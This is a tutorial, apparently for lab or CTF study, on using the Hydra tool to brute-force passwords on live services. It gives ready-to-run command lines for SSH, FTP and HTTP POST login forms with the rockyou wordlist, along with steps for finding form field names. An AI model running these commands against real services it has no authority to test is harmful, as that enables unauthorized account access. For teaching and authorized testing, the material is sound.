Hydra — Online Password Brute-Forcing
 
---
 
### What is Hydra?
 
**Hydra** is a fast, parallelized online password brute-forcing tool. Unlike offline crackers (John the Ripper, Hashcat) that work against stored hashes, Hydra attacks **live authentication services** directly — trying passwords against running services in real time.
 
#### Supported Protocols (partial list)
 
SSH, FTP, HTTP/HTTPS (GET/POST forms), SMTP, POP3, IMAP, SMB, RDP, MySQL, PostgreSQL, MongoDB, SNMP, Telnet, VNC, LDAP, and many more.
 
> **Requires root/sudo** for many protocol modules.
 
---
 
### Core Syntax
 
```bash
hydra [options] target service
```
 
#### Key Options
 
| Option | Description |
|---|---|
| `-l <username>` | Single username to try |
| `-L <file>` | File containing a list of usernames |
| `-p <password>` | Single password to try |
| `-P <file>` | File containing a list of passwords |
| `-t <n>` | Number of parallel threads (default: 16) |
| `-s <port>` | Specify a non-default port |
| `-V` | Verbose — show every attempt |
| `-f` | Stop after the first successful login found |
 
---
 
### SSH Brute Force
 
```bash
hydra -l <username> -P <passwordlist> MACHINE_IP -t 4 ssh
```
 
**Example:**
```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt 10.10.10.5 -t 4 ssh
```
 
| Part | Meaning |
|---|---|
| `-l root` | Try username `root` |
| `-P rockyou.txt` | Use rockyou.txt as the password list |
| `10.10.10.5` | Target IP |
| `-t 4` | 4 parallel threads |
| `ssh` | Target protocol |
 
---
 
### FTP Brute Force
 
```bash
hydra -l user -P passlist.txt ftp://MACHINE_IP
```
 
---
 
### Web Form Brute Force (HTTP POST)
 
Web login forms require knowing the form structure — field names and the string that appears on a failed login.
 
```bash
hydra -l <username> -P <wordlist> MACHINE_IP http-post-form \
  "<path>:<login_credentials>:<invalid_response>" -V
```
 
#### Breaking Down the http-post-form String
 
```
"/<path>:field1=^USER^&field2=^PASS^:F=<failure_string>"
```
 
| Part | Description |
|---|---|
| `<path>` | URL path to the login page (e.g., `/login.php` or `/`) |
| `^USER^` | Hydra replaces this with each username |
| `^PASS^` | Hydra replaces this with each password |
| `F=<string>` | String that appears in the response when login **fails** |
 
#### Worked Example
 
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.5 \
  http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
```
 
| Part | Meaning |
|---|---|
| `-l admin` | Try username `admin` |
| `-P rockyou.txt` | Password wordlist |
| `10.10.10.5` | Target IP |
| `http-post-form` | Protocol — HTTP POST form |
| `/` | Login page is at the root URL |
| `username=^USER^` | Form field name for username |
| `password=^PASS^` | Form field name for password |
| `F=incorrect` | "incorrect" appears in the response when login fails |
| `-V` | Verbose — show every attempt |
 
#### Non-Default Port
 
```bash
hydra -l admin -P wordlist.txt MACHINE_IP \
  http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -s 8080 -V
```
 
> Use `-s <port>` when the service runs on a non-standard port.
 
---
 
### Finding Form Field Names
 
To identify the correct field names and failure string for HTTP POST attacks:
 
1. Open browser **Developer Tools** (`F12`) → **Network** tab
2. Submit a test login
3. Click the POST request → inspect the **Form Data** / **Payload**
4. Note the field names (e.g., `username`, `password`) and what the failed-login page contains
Alternatively: **View Page Source** to find the `<input name="...">` fields in the HTML form.
 
---
 
### Hydra vs. Offline Cracking Tools
 
| | Hydra | John the Ripper / Hashcat |
|---|---|---|
| **Target** | Live, running services | Stored hash files |
| **Requires network?** | Yes | No |
| **Speed** | Limited by network/service | Limited by CPU/GPU |
| **Detectability** | High — generates login attempts in logs | None — purely local |
| **Use case** | Online brute force (SSH, FTP, web forms) | Offline hash cracking |
 
---
 
### Quick Reference
 
| Attack Type | Command Pattern |
|---|---|
| SSH | `hydra -l user -P wordlist.txt TARGET -t 4 ssh` |
| FTP | `hydra -l user -P wordlist.txt ftp://TARGET` |
| HTTP POST form | `hydra -l user -P wordlist.txt TARGET http-post-form "/path:fields:F=fail_string" -V` |
| HTTP POST (custom port) | Add `-s <port>` to any HTTP command |
| Multiple usernames | Replace `-l user` with `-L userlist.txt` |
| Stop on first success | Add `-f` flag |
| Verbose output | Add `-V` flag |
 
 
## Summary
 
- **Hydra** attacks live authentication services directly (SSH, FTP, HTTP/HTTPS forms, SMTP, RDP, MySQL, and many more), unlike offline crackers that work against stored hashes.
- Core syntax is `hydra [options] target service`, with key options including `-l`/`-L` (username/username list), `-p`/`-P` (password/password list), `-t` (threads), `-s` (custom port), `-V` (verbose), and `-f` (stop on first success).
- **HTTP POST form** attacks require the login page path, the form field names for username/password (using `^USER^`/`^PASS^` placeholders), and a failure string (`F=`) that appears on a failed login — all identifiable via browser DevTools' Network tab or page source.
- Compared to offline tools, Hydra is network-limited and highly detectable (it generates login attempts in service logs), whereas John the Ripper/Hashcat are CPU/GPU-limited and leave no network trace.
